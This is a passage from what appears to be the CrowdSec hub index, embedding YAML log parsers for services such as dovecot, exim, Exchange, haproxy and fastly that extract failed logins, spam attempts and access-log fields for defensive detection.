HTTP/%{NUMBER:http_version}\" %{INT:status} %{INT:request_body_length} \"%{NOTSPACE:http_referer}\" \"%{NO_DOUBLE_QUOTE:http_user_agent}\" \"%{NO_DOUBLE_QUOTE:auth_method}\" \"%{NO_DOUBLE_QUOTE:x_forwarded_for}\" %{NUMBER:server_port}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_access-log\nstatics:\n  - meta: service\n    value: http\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - meta: http_path\n    expression: \"evt.Parsed.request\"\n  - meta: http_verb\n    expression: \"evt.Parsed.verb\"\n  - meta: http_user_agent\n    expression: \"evt.Parsed.http_user_agent\"\n  - meta: http_status\n    expression: \"evt.Parsed.status\"\n  - meta: username\n    expression: \"evt.Parsed.username\"", "description": "Parse Cpanel logs", "path": "parsers/s01-parse/crowdsecurity/cpanel-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "1ff320cb8be4b2ed7e02f2614277d32fcfe8ee60058f6480bb3ab4ff53125ae0"}, "0.2": {"digest": "38155a2c95c77f26ae07f1718f01eb0fbf946b7dde10f50d375d6b82095807cb"}, "0.3": {"digest": "66ff0528cc940645a2a1e07894b048d52c9eb02341f6e2abe8756e70ae36f870"}, "0.4": {"digest": "3ce770d729d896d39598fa0f2d560edf900a05dbcd4f9a460e35a987f8eca8cf"}}}, "crowdsecurity/cri-logs": {"content": "filter: \"evt.Line.Labels.type == 'containerd'\"\nonsuccess: next_stage\nname: crowdsecurity/cri-logs\ndescription: CRI logging format parser\nnodes:\n  - grok:\n      pattern: \"^%{TIMESTAMP_ISO8601:cri_timestamp} %{WORD:stream} %{WORD:logtag} %{GREEDYDATA:message}\"\n      apply_on: Line.Raw\nstatics:\n  - parsed: \"logsource\"\n    value: \"cri\"\n  - target: evt.StrTime\n    expression: evt.Parsed.cri_timestamp\n  - parsed: program\n    expression: evt.Line.Labels.program\n  - meta: datasource_path\n    expression: evt.Line.Src\n  - meta: datasource_type\n    expression: evt.Line.Module", "description": "CRI logging format parser", "path": "parsers/s00-raw/crowdsecurity/cri-logs.yaml", "stage": "s00-raw", "version": "0.1", "versions": {"0.1": {"digest": "3818208420042396bc2ed0d75dee43d6651c5979b351642128d11ce8360f7347"}}}, "crowdsecurity/dateparse-enrich": {"content": "filter: \"evt.StrTime != ''\"\nname: crowdsecurity/dateparse-enrich\n#debug: true\n#it's a hack lol\nstatics:\n  - method: ParseDate\n    expression: evt.StrTime\n  - target: MarshaledTime\n    expression: evt.Enriched.MarshaledTime\n  - meta: timestamp\n    expression: evt.Enriched.MarshaledTime", "path": "parsers/s02-enrich/crowdsecurity/dateparse-enrich.yaml", "stage": "s02-enrich", "version": "0.2", "versions": {"0.1": {"digest": "16b79f7ef39d0c5e71180cff559b0e2ef98983f2009b5f26d778509e897f94d4"}, "0.2": {"digest": "3f51a6c389bbf1c38f49d8824b6bffd9a265d0fa78a98af71628256019847951"}}}, "crowdsecurity/docker-logs": {"content": "#If it's docker, we are going to extract log line from it\nfilter: \"evt.Line.Labels.type == 'docker'\"\nonsuccess: next_stage\nname: crowdsecurity/docker-logs\ndescription: docker json logs parser\nstatics:\n  - target: evt.StrTime\n    expression: JsonExtract(evt.Line.Raw, \"time\")\n  - parsed: message\n    expression: JsonExtractUnescape(evt.Line.Raw, \"log\")\n  - parsed: program\n    expression: evt.Line.Labels.program", "description": "docker json logs parser", "path": "parsers/s00-raw/crowdsecurity/docker-logs.yaml", "stage": "s00-raw", "version": "0.1", "versions": {"0.1": {"digest": "b4f5459826ae22b000239839f51c82b0358625f71416f9ef2540719eb791a746"}}}, "crowdsecurity/dovecot-logs": {"content": "#contribution by @ltsich\nonsuccess: next_stage\ndebug: false\nfilter: \"evt.Parsed.program == 'dovecot'\"\nname: crowdsecurity/dovecot-logs\ndescription: \"Parse dovecot logs\"\npattern_syntax:\n  AUTH_FUNC: '[A-Za-z0-9_]+(\\(\\))?'\nnodes:\n  - grok:\n      pattern: \"%{WORD:protocol}-login: %{DATA:dovecot_login_message}: user=<%{DATA:dovecot_user}>.*, rip=%{IP:dovecot_remote_ip}, lip=%{IP:dovecot_local_ip}\"\n      apply_on: message\n  - grok:\n      pattern: \"auth-worker\\\\(%{INT}\\\\): %{WORD:dovecot_user_backend}\\\\(%{DATA:dovecot_user},%{IP:dovecot_remote_ip},?%{DATA}\\\\): (%{AUTH_FUNC:auth_func} failed: )?%{DATA:dovecot_login_message}$\"\n      apply_on: message\n  - grok:\n      pattern: \"auth-worker\\\\(%{INT}\\\\): (Info: )?conn unix:auth-worker \\\\(pid=%{INT},uid=%{INT}\\\\): auth-worker<%{INT}>: %{WORD:dovecot_user_backend}\\\\(%{DATA:dovecot_user},%{IP:dovecot_remote_ip},?%{DATA}\\\\): (%{AUTH_FUNC:auth_func} failed: )?%{DATA:dovecot_login_message}$\"\n      apply_on: message\n  - grok:\n      pattern: \"auth: passwd-file\\\\(%{DATA:dovecot_user},%{IP:dovecot_remote_ip}\\\\): (%{AUTH_FUNC:auth_func} failed: )?%{DATA:dovecot_login_message}$\"\n      apply_on: message\nstatics:\n    - meta: log_type\n      value: dovecot_logs\n    - meta: source_ip\n      expression: \"evt.Parsed.dovecot_remote_ip\"\n    - meta: dovecot_login_result\n      expression: \"any(['Authentication failure', 'Password mismatch', 'password mismatch', 'auth failed', 'unknown user'], {evt.Parsed.dovecot_login_message contains #}) ? 'auth_failed' : ''\"\n", "description": "Parse dovecot logs", "path": "parsers/s01-parse/crowdsecurity/dovecot-logs.yaml", "stage": "s01-parse", "version": "0.9", "versions": {"0.1": {"digest": "3d30684b5d1ceea08ea743a2fa1697178d878bd87eb55e465432c000da162b42"}, "0.2": {"digest": "e1fdf543acd0fb44d6db33368c5250d4667a5c2283c8310fd0fd6f87a820276a"}, "0.3": {"digest": "58047a5c1f160cf95b7156eeaf9f17428f8bb8a070776f6ea6531c4110e2aa6e"}, "0.4": {"digest": "2fdc9cb6499f83dcda7897cb05bfbe7639938980986b32b5f37adc4b2f7594c9"}, "0.5": {"digest": "8a814d554c02f3e2ab28ee0dadd019f6bfe2830f44cb22e2206c9314cae4aa81"}, "0.6": {"digest": "26e433e5003785f182395e76d43a5b9b0fc40c7db7ae7f52c33cdf8a3b543ac9"}, "0.7": {"digest": "c9920defec4d26589457f01517eae8a3f6ba5fd5104ed3c17badbe5cf145dc64"}, "0.8": {"digest": "638a4596262469ddaff8d608921513f2e84cb5e822f67e902e0097812ff28ada"}, "0.9": {"digest": "daf37a858cc3f3359b9637552f768acc59d7f29db702399fb6e720193dfd5673"}}}, "crowdsecurity/dropbear-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'dropbear'\"\nname: crowdsecurity/dropbear-logs\ndescription: \"Parse dropbear logs\"\nnodes:\n  - grok: \n      pattern: \"Bad PAM password attempt for '%{DATA:user}' from %{IP:source_ip}:%{INT:port}\"\n      apply_on: message\n  - grok: \n      pattern: \"Login attempt for nonexistent user from %{IP:source_ip}:%{INT:port}\"\n      apply_on: message\n  - grok: \n      pattern: \"Exit before auth from <%{IP:source_ip}:%{INT:port}>:\"\n      apply_on: message\nstatics:\n  - meta: service\n    value: dropbear\n  - meta: target_user\n    expression: evt.Parsed.user\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n  - meta: log_type\n    value: ssh_failed-auth\n", "description": "Parse dropbear logs", "path": "parsers/s01-parse/crowdsecurity/dropbear-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "316bce3c9bfd35900b9a4d668189fa733a2a91d65f3725337c085ac18af51d38"}, "0.2": {"digest": "1bc1ef9778e3d75213ab3475e51107516b6b176783533f3855a9d37940828015"}, "0.3": {"digest": "800157f738f9ae98cc07be084f7451695085e587a1bc58e8485e40ced4c4d2a5"}}}, "crowdsecurity/endlessh-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'endlessh'\"\nname: crowdsecurity/endlessh-logs\ndescription: \"Parse Endlessh logs\"\npattern_syntax:\n  ENDLESSH_GO_DATE: \"%{MONTHNUM2}%{DAY2} %{TIME}\"\n  ENDLESSH_GO_LINE: \"I%{ENDLESSH_GO_DATE:timestamp}.*\\\\] ACCEPT host=%{IP:source_ip} \"\n  ENDLESSH_ACCEPT_V4: \"%{TIMESTAMP_ISO8601:timestamp}? ACCEPT host=(::ffff:)?%{IPV4:source_ip} \"\n  ENDLESSH_ACCEPT_V6: \"%{TIMESTAMP_ISO8601:timestamp}? ACCEPT host=%{IPV6:source_ip} \"\nnodes:\n  - grok:\n      name: \"ENDLESSH_GO_LINE\"\n      apply_on: Line.Raw\n      statics:\n        - meta: log_type\n          value: endlessh_accept\n        - target: evt.StrTimeFormat\n          value: \"0102 15:04:05\"\n  - grok:\n      name: \"ENDLESSH_ACCEPT_V4\"\n      apply_on: Line.Raw\n      statics:\n        - meta: log_type\n          value: endlessh_accept\n  - grok:\n      name: \"ENDLESSH_ACCEPT_V6\"\n      apply_on: Line.Raw\n      statics:\n        - meta: log_type\n          value: endlessh_accept\n\nstatics:\n  - meta: service\n    value: endlessh\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n", "description": "Parse Endlessh logs", "path": "parsers/s01-parse/crowdsecurity/endlessh-logs.yaml", "stage": "s01-parse", "version": "0.5", "versions": {"0.1": {"digest": "dc1affad319badddf95ad1a16bf633b6fd70ed02db0e490dc0540eef47576f2a"}, "0.2": {"digest": "ca022caa2de3a13101bea25006686a4d92ffb0e7bd558e44d215f481526632f1"}, "0.3": {"digest": "ebb816832a32b98dca8e15f402c30c1010cf5ad1ebc2b1f910f74f40fd115902"}, "0.4": {"digest": "c6ddcc2a112b82ad359243a7d8152c1caae47ddf3722b42af6be3b44f5fcb4e4"}, "0.5": {"digest": "620c6dc58cb72a142a957f3d138ba68228281c031e27fd0a1aab2f8e2f6f093b"}}}, "crowdsecurity/exchange-imap-logs": {"content": "filter: \"evt.Parsed.program == 'exchange-imap'\"\nonsuccess: next_stage\n#debug: true\nname: crowdsecurity/exchange-imap-logs\ndescription: \"Parse exchange IMAP logs\"\n#dateTime,sessionId,seqNumber,sIp,cIp,user,duration,rqsize,rpsize,command,parameters,context,puid\n#2022-06-16T09:41:21.094Z,000000000000004B,2,192.168.9.241:993,192.168.9.212:49016,foobar,34,31,31,authenticate,PLAIN,\"R=\"\"2 NO AUTHENTICATE failed.\"\";Msg=\"\"AuthFailed:LogonDenied,User: foobar\"\";ErrMsg=AuthFailed:LogonDenied\",\ngrok:\n  pattern: \"%{TIMESTAMP_ISO8601:date},%{DATA:session_id},%{INT:sequence_number},%{IPORHOST:server_ip}:%{INT:server_port},%{IPORHOST:client_ip}:%{INT:client_port},%{DATA:username},%{INT:duration},%{INT:rqsize},%{INT:rpsize},%{WORD:command},%{DATA:parameters},%{DATA}AuthFailed:LogonDenied\\\",%{DATA:puid}?\"\n  apply_on: message\nstatics:\n  - target: evt.StrTime\n    expression: evt.Parsed.date\n  - meta: source_ip\n    expression: evt.Parsed.client_ip\n  - meta: service\n    value: exchange\n  - meta: log_type\n    value: imap\n  - meta: sub_type\n    value: auth_fail", "description": "Parse exchange IMAP logs", "path": "parsers/s01-parse/crowdsecurity/exchange-imap-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "13a7780e3f01839342580cb6845342ad612f06b34b35f540f0e31c7509999da2"}}}, "crowdsecurity/exchange-pop-logs": {"content": "filter: \"evt.Parsed.program == 'exchange-pop'\"\nonsuccess: next_stage\n#debug: true\nname: crowdsecurity/exchange-pop-logs\ndescription: \"Parse exchange POP logs\"\n#dateTime,sessionId,seqNumber,sIp,cIp,user,duration,rqsize,rpsize,command,parameters,context,puid\n#2022-06-20T00:03:48.531Z,0000000000001E86,1,192.168.9.241:995,192.168.9.212:33526,testuser,171,21,69,auth, PLAIN,\"R=\"\"-ERR Authentication failure: unknown user name or bad password.\"\";Msg=\"\"AuthFailed:LogonDenied,User: testuser\"\";ErrMsg=AuthFailed:LogonDenied\",\ngrok:\n  pattern: \"%{TIMESTAMP_ISO8601:date},%{DATA:session_id},%{INT:sequence_number},%{IPORHOST:server_ip}:%{INT:server_port},%{IPORHOST:client_ip}:%{INT:client_port},%{DATA:username},%{INT:duration},%{INT:rqsize},%{INT:rpsize},%{WORD:command},%{DATA:parameters},%{DATA}AuthFailed:LogonDenied\\\",%{DATA:puid}?\"\n  apply_on: message\nstatics:\n  - target: evt.StrTime\n    expression: evt.Parsed.date\n  - meta: source_ip\n    expression: evt.Parsed.client_ip\n  - meta: service\n    value: exchange\n  - meta: log_type\n    value: pop\n  - meta: sub_type\n    value: auth_fail", "description": "Parse exchange POP logs", "path": "parsers/s01-parse/crowdsecurity/exchange-pop-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "a63be634585ef106f64781029c01f4fc8bfc77bb277a70775c73c181a467894f"}}}, "crowdsecurity/exchange-smtp-logs": {"content": "filter: \"evt.Parsed.program == 'exchange-smtp'\"\nonsuccess: next_stage\n#debug: true\nname: crowdsecurity/exchange-smtp-logs\ndescription: \"Parse exchange SMTP logs\"\n#date-time,connector-id,session-id,sequence-number,local-endpoint,remote-endpoint,event,data,context\n#2022-04-28T13:24:50.200Z,EXCHANGE-1\\Default Frontend EXCHANGE-1,08DA28A9AF671267,15,192.168.9.241:25,192.168.9.212:28657,>,535 5.7.3 Authentication unsuccessful,\ngrok:\n  pattern: \"%{TIMESTAMP_ISO8601:date},%{DATA:connector_id},%{DATA:session_id},%{INT:sequence_number},%{IPORHOST:server_ip}:%{INT:server_port},%{IPORHOST:client_ip}:%{INT:client_port},%{DATA:event},%{INT:smtp_code} [^ ]+ %{DATA:smtp_message},\"\n  apply_on: message\nstatics:\n  - target: evt.StrTime\n    expression: evt.Parsed.date\n  - meta: source_ip\n    expression: evt.Parsed.client_ip\n  - meta: smtp_message\n    expression: evt.Parsed.smtp_message\n  - meta: service\n    value: exchange\n  - meta: log_type\n    value: smtp\n  - meta: sub_type\n    value: auth_fail", "description": "Parse exchange SMTP logs", "path": "parsers/s01-parse/crowdsecurity/exchange-smtp-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "158fe6b19f9cc5b900de750c43522a86e68691156e489e1922b7c89e6f9300fe"}, "0.2": {"digest": "a9aff504ce013489311d4c85e6fe4f7594326e6351a7c024c93cd15950f66c09"}}}, "crowdsecurity/exim-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'exim'\"\nname: crowdsecurity/exim-logs\ndescription: \"Parse exim logs\"\npattern_syntax:\n  NO_DOUBLE_QUOTE: '[^\"]+'\n  NO_END_BRACKET: '[^\\]]+'\n  NO_END_PAR: '[^\\)]+'\n  EXIM_AUTH: '(?:dovecot_)?(?:login|plain)'\n  EXIM_SOURCE: '(?:%{HOSTNAME:source_dns} )?(?:\\(%{NO_END_PAR:source_helo}\\) )?\\[%{IP:source_ip}\\]'\n  EXIM_OPT_DATE: '(:?%{EXIM_DATE:date} )?'\n  EXIM_SOURCE_TLS: 'H=%{EXIM_SOURCE}(?::%{POSINT:source_port})? (:?X=%{NOTSPACE:tls_cipher} CV=(:?yes|no) )?'\nnodes:\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_AUTH:exim_auth} authenticator failed for %{EXIM_SOURCE}:(?:%{POSINT:source_port}:)? 535 Incorrect authentication data \\(set_id=%{NO_END_PAR:target_user}\\)'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: exim_failed_auth\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_SOURCE_TLS}F=<%{EMAILADDRESS:source_user}> rejected RCPT <%{EMAILADDRESS:target_user}>: \"JunkMail rejected - %{NOTSPACE} \\[%{NO_END_BRACKET}\\]:%{INT} is in an RBL: %{NO_DOUBLE_QUOTE:rbl_url}\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: spam-attempt\n        - meta: rbl_url\n          expression: evt.Parsed.rbl_url\n        - meta: source_user\n          expression: evt.Parsed.source_user\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_SOURCE_TLS}F=<%{EMAILADDRESS:source_user}> rejected RCPT <%{EMAILADDRESS:target_user}>: Email blocked by %{HOSTNAME:rbl_url}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: spam-attempt\n        - meta: rbl_url\n          expression: evt.Parsed.rbl_url\n        - meta: source_user\n          expression: evt.Parsed.source_user\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_SOURCE_TLS}F=<%{EMAILADDRESS:source_user}> rejected RCPT <%{EMAILADDRESS:target_user}>: No Such User Here'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: exim_failed_auth\n        - meta: source_user\n          expression: evt.Parsed.source_user\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_SOURCE_TLS}temporarily rejected connection in \"%{NO_DOUBLE_QUOTE:acl}\" ACL: \"Host is ratelimited \\(%{NO_END_PAR:rate_limit}\\)'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: spam-attempt\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_SOURCE_TLS}sender verify fail for <%{EMAILADDRESS:source_user}>: The mail server does not recognize %{NOTSPACE} as a valid sender.'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: spam-attempt\n        - meta: source_user\n          expression: evt.Parsed.source_user\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_SOURCE_TLS}F=<%{EMAILADDRESS:source_user}> rejected RCPT <%{EMAILADDRESS:target_user}>: Sender verify failed'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: spam-attempt\n        - meta: source_user\n          expression: evt.Parsed.source_user\n  - grok:\n      pattern: '%{EXIM_OPT_DATE}%{EXIM_SOURCE_TLS}F=<%{EMAILADDRESS:source_user}> rejected RCPT <%{EMAILADDRESS:target_user}>: SMTP AUTH is required for message submission on port %{POSINT:target_port}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: spam-attempt\n        - meta: source_user\n          expression: evt.Parsed.source_user\n        - meta: target_port\n          expression: evt.Parsed.target_port\nstatics:\n  - meta: service\n    value: exim\n  - target: evt.StrTime\n    expression: evt.Parsed.date\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n  - meta: source_dns\n    expression: evt.Parsed.source_dns\n  - meta: source_helo\n    expression: evt.Parsed.source_helo\n  - meta: username\n    expression: evt.Parsed.target_user\n", "description": "Parse exim logs", "path": "parsers/s01-parse/crowdsecurity/exim-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "507fd358283a08ff01d7fd2a19c5aec6e9be18e37008bcd470d4af8d71b94db2"}, "0.2": {"digest": "a953bad60f49d02a3bb0b3928d26f5184414eb8f7026fd62cec7b52081ce9cd2"}, "0.3": {"digest": "0a7b71758bb626381f1f540871b1d1f4e8d2af3c88d8466ed85aed94c9e912c6"}}}, "crowdsecurity/fastly-logs": {"content": "filter: \"evt.Line.Labels.external_format == 'fastly'\"\nonsuccess: next_stage\n#debug: true\nname: crowdsecurity/fastly-logs\ndescription: fastly logs parser\npattern_syntax:\n  DOUBLE_NUM: \"[0-9]{2}\"\ngrok:\n  pattern: \"%{GREEDYDATA:fastly_timestamp}\\\\+%{DOUBLE_NUM:tz_part1}%{DOUBLE_NUM:tz_part2}\"\n  expression: JsonExtract(evt.Parsed.message, \"timestamp\")\nstatics:\n  - meta: service\n    value: http\n  - meta: log_type\n    value: http_access-log\n  - target: evt.StrTime\n    expression: evt.Parsed.fastly_timestamp + \".00+\" + evt.Parsed.tz_part1 + \":\" + evt.Parsed.tz_part2\n  - meta: source_ip\n    expression: JsonExtract(evt.Parsed.message, \"client_ip\")\n  - target: evt.Parsed.request\n    expression: JsonExtract(evt.Parsed.message, \"url\")\n  - meta: http_path\n    expression: JsonExtract(evt.Parsed.message, \"url\")\n  - parsed: verb\n    expression: JsonExtract(evt.Parsed.message, \"request_method\")\n  - meta: verb\n    expression: JsonExtract(evt.Parsed.message, \"request_method\")\n  - parsed: http_referer\n    expression: JsonExtract(evt.Parsed.message, \"request_referer\")\n  - parsed: http_user_agent\n    expression: JsonExtract(evt.Parsed.message, \"request_user_agent\")\n  - meta: http_user_agent\n    expression: JsonExtract(evt.Parsed.message, \"request_user_agent\")\n  - meta: http_status\n    expression: JsonExtract(evt.Parsed.message, \"response_status\")\n  - parsed: body_bytes_sent\n    expression: JsonExtract(evt.Parsed.message, \"response_body_size\")", "description": "fastly logs parser", "path": "parsers/s01-parse/crowdsecurity/fastly-logs.yaml", "stage": "s01-parse", "version": "0.6", "versions": {"0.1": {"digest": "8d1cbf3514b3e7f0ff31ab725befdfdd8d2393392450f407937b80456b168b5a"}, "0.2": {"digest": "b344fa353c085e6651526716184ac7b4299f62ed7fd39163884b1bf865a80230"}, "0.3": {"digest": "b8dcd888169ab2b9efed507a4d977b3bc7925f4ab834a6765899f0636733f5e5"}, "0.4": {"digest": "6e34459bf59e89b72e72598605b8c39ef91ac9fcf2b655d02ec56dfc60059ab0"}, "0.5": {"digest": "7bddb9e5d4eac138276f8e8af31b460f5fd10c0d62977746a78d8d74edda0de7"}, "0.6": {"digest": "b27ea9a9c982e9f907574456973364fc5b91ea85cebbfbf6ab43f74a51d5064d"}}}, "crowdsecurity/fortinet-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'fortinet' && ParseKV(evt.Parsed.message, evt.Unmarshaled, 'fortinet') in [nil, '']\"\nname: crowdsecurity/fortinet-logs\ndescription: \"Parse fortinet logs\"\nstatics:\n  - meta: service\n    value: fortinet\n  - meta: sub_type\n    expression: \"evt.Unmarshaled.fortinet.subtype\"\n  - target: evt.StrTime\n    expression: evt.Unmarshaled.fortinet.date + ' ' + evt.Unmarshaled.fortinet.time\n  - meta: source_ip\n    expression: \"evt.Unmarshaled.fortinet.remip\"\n  - meta: action\n    expression: \"evt.Unmarshaled.fortinet.action\"\n  - meta: tunnel_type\n    expression: \"evt.Unmarshaled.fortinet.tunneltype\"\n  - meta: reason\n    expression: \"evt.Unmarshaled.fortinet.reason\"\n  - meta: msg\n    expression: \"evt.Unmarshaled.fortinet.msg\"\n  - meta: target_user\n    expression: \"evt.Unmarshaled.fortinet.user\"", "description": "Parse fortinet logs", "path": "parsers/s01-parse/crowdsecurity/fortinet-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "10915774f7b2f95706d966fddf128c76971bba7328c798957f2e6aa51200dd0d"}}}, "crowdsecurity/freeswitch": {"content": "filter: \"evt.Parsed.program startsWith 'freeswitch'\"\nonsuccess: next_stage\n# debug: true\nname: crowdsecurity/freeswitch\ndescription: \"Parse freeswitch logs\"\npattern_syntax:\n  TIMESTAMP: '%{YEAR}-%{MONTHNUM}-%{MONTHDAY} %{HOUR}:%{MINUTE}:%{SECOND}'\nnodes:\n- grok:\n    pattern: '%{TIMESTAMP:timestamp}.*\\[WARNING\\] sofia_reg.c:\\d+ %{GREEDYDATA:parsedmessage}'\n    apply_on: message\n  nodes:\n  - grok:\n      pattern: \"Can't find user \\\\[.*@%{IPORHOST}\\\\] from %{IPORHOST:remote_ip}\"\n      apply_on: parsedmessage\n    onsuccess: next_stage\n    statics:\n      - meta: sub_type\n        value: user_enumeration\n  - grok:\n      pattern: \"IP %{IPORHOST:remote_ip} Rejected by register acl\"\n      apply_on: parsedmessage\n    onsuccess: next_stage\n    statics:\n      - meta: sub_type\n        value: acl_reject\n  - grok:\n      pattern: \"SIP auth failure \\\\((REGISTER|INVITE)\\\\) on sofia profile '.*' for \\\\[.*\\\\] from ip %{IPORHOST:remote_ip}\"\n      apply_on: parsedmessage\n    onsuccess: next_stage\n    statics:\n      - meta: sub_type\n        value: auth_failure\nstatics:\n  - meta: service\n    value: freeswitch\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp\n  - meta: source_ip\n    expression: evt.Parsed.remote_ip", "description": "Parse freeswitch logs", "path": "parsers/s01-parse/crowdsecurity/freeswitch.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "49dd62c738ceda31de61fbf5c4ed38e348a0c33a78bcc6090a4362964570f237"}}}, "crowdsecurity/geoip-enrich": {"content": "filter: |\n  let ipv6Check = IsIPV6(evt.Meta.source_ip);\n  \"source_ip\" in evt.Meta &&\n  (\n    not ipv6Check &&\n    not (IpInRange(evt.Meta.source_ip, \"127.0.0.0/8\") || IpInRange(evt.Meta.source_ip, \"192.168.0.0/16\") || IpInRange(evt.Meta.source_ip, \"172.16.0.0/12\") || IpInRange(evt.Meta.source_ip, \"10.0.0.0/8\"))\n  ) ||\n  (\n    ipv6Check &&\n    not (IpInRange(evt.Meta.source_ip, \"::1/128\") || IpInRange(evt.Meta.source_ip, \"fd00::/8\") || IpInRange(evt.Meta.source_ip, \"fc00::/7\"))\n  )\n\nname: crowdsecurity/geoip-enrich\ndescription: \"Populate event with geoloc info : as, country, coords, source range.\"\ndata:\n  - source_url: https://hub-data.crowdsec.net/mmdb_update/GeoLite2-City.mmdb\n    dest_file: GeoLite2-City.mmdb\n  - source_url: https://hub-data.crowdsec.net/mmdb_update/GeoLite2-ASN.mmdb\n    dest_file: GeoLite2-ASN.mmdb\nstatics:\n  - method: GeoIpCity\n    expression: evt.Meta.source_ip\n  - meta: IsoCode\n    expression: evt.Enriched.IsoCode\n  - meta: IsInEU\n    expression: evt.Enriched.IsInEU\n  - meta: GeoCoords\n    expression: evt.Enriched.GeoCoords\n  - method: GeoIpASN\n    expression: evt.Meta.source_ip\n  - meta: ASNNumber\n    expression: evt.Enriched.ASNNumber\n  - meta: ASNOrg\n    expression: evt.Enriched.ASNOrg\n  - method: IpToRange\n    expression: evt.Meta.source_ip\n  - meta: SourceRange\n    expression: evt.Enriched.SourceRange\n", "description": "Populate event with geoloc info : as, country, coords, source range.", "path": "parsers/s02-enrich/crowdsecurity/geoip-enrich.yaml", "stage": "s02-enrich", "version": "0.5", "versions": {"0.1": {"digest": "c0718adfc71ad462ad90485ad5c490e5de0e54d8af425bff552994e114443ab6"}, "0.2": {"digest": "ab327e6044a32de7d2f3780cbc8e0c4af0c11716f353023d2dc7b986571bb765"}, "0.3": {"digest": "91e2f0d42c0fd57198485ce0d9caa4d53c7a99756e202cb4221b8151ec8aef1a"}, "0.4": {"digest": "09ccb22bbb74ca4982954f233f53e6cd005e09f27e252804e3a0b3da0389bf86"}, "0.5": {"digest": "56ec28d85c75e55af349b8165f2d494534e2f4144f27a985ece316e8ac5303ae"}}}, "crowdsecurity/haproxy-logs": {"content": "filter: \"evt.Parsed.program startsWith 'haproxy'\"\nonsuccess: next_stage\nname: crowdsecurity/haproxy-logs\ndescription: \"Parse haproxy http logs\"\nnodes:\n- grok:\n    pattern: '%{IP:client_ip}:%{INT:client_port} \\[%{HAPROXYDATE:accept_date}\\] %{NOTSPACE:frontend_name} %{NOTSPACE:backend_name}/%{NOTSPACE:server_name} %{INT:time_request}/%{INT:time_queue}/%{INT:time_backend_connect}/%{INT:time_backend_response}/%{NOTSPACE:time_duration} %{INT:http_status_code} %{NOTSPACE:bytes_read} %{DATA:captured_request_cookie} %{DATA:captured_response_cookie} %{NOTSPACE:termination_state} %{INT:actconn}/%{INT:feconn}/%{INT:beconn}/%{INT:srvconn}/%{NOTSPACE:retries} %{INT:srv_queue}/%{INT:backend_queue} (\\{%{HAPROXYCAPTUREDREQUESTHEADERS}\\})?( )?(\\{%{HAPROXYCAPTUREDRESPONSEHEADERS}\\})?( )?\"(<BADREQ>|(%{WORD:http_verb} (%{URIPROTO:http_proto}://)?(?:%{USER:http_user}(?::[^@]*)?@)?(?:%{URIHOST:http_host})?(?:%{URIPATHPARAM:http_request})?( HTTP/%{NUMBER:http_version})?))?\"'\n    apply_on: message\n  statics:\n  - meta: log_type\n    value: http_access-log\n    \n- grok:\n    pattern: '%{IP:client_ip}:%{INT:client_port} \\[%{HAPROXYDATE:accept_date}\\] %{NOTSPACE:frontend_name}/%{NOTSPACE:server_name}: SSL handshake failure'\n    apply_on: message\n  statics:\n    - meta: log_type\n      value: bad_ssl_handshake\n\nstatics:\n    #HAPROXYDATE format is unknown to dateparse, let convert it to a format we know to parse\n  - target: evt.StrTime\n    expression: evt.Parsed.haproxy_monthday + '/' + evt.Parsed.haproxy_month   + '/' + evt.Parsed.haproxy_year  + ':' +   evt.Parsed.haproxy_hour + ':' + evt.Parsed.haproxy_minute + ':' +  evt.Parsed.haproxy_second[0:2] + ' -0000'\n  - meta: service\n    value: http\n  - meta: source_ip\n    expression: evt.Parsed.client_ip\n  - meta: http_path\n    expression: evt.Parsed.http_request\n  - meta: http_status\n    expression: evt.Parsed.http_status_code\n  - meta: http_verb\n    expression: evt.Parsed.http_verb\n  - parsed: request\n    expression: evt.Parsed.http_request\n  - parsed: verb\n    expression: evt.Parsed.http_verb\n\n", "description": "Parse haproxy http logs", "path": "parsers/s01-parse/crowdsecurity/haproxy-logs.yaml", "stage": "s01-parse", "version": "0.8", "versions": {"0.1": {"digest": "a2bca50192c0623d8d553882fbac0f6fa1d6dc824804aa0a5ca7559ed65321f4"}, "0.2": {"digest": "2257440ad5cba6a7c48c7e57a0d30a97b38656927fa18a0f7289d05042035cb4"}, "0.3": {"digest": "e40b4e552cf417be4bd57f3cb452af057a8872dc16a35a51eb3bb38726bf6dd6"}, "0.4": {"digest": "029545297f7d2beab8f98ad471ef15fd6165e86e645aface54cb9d8b522ab08e"}, "0.5": {"digest": 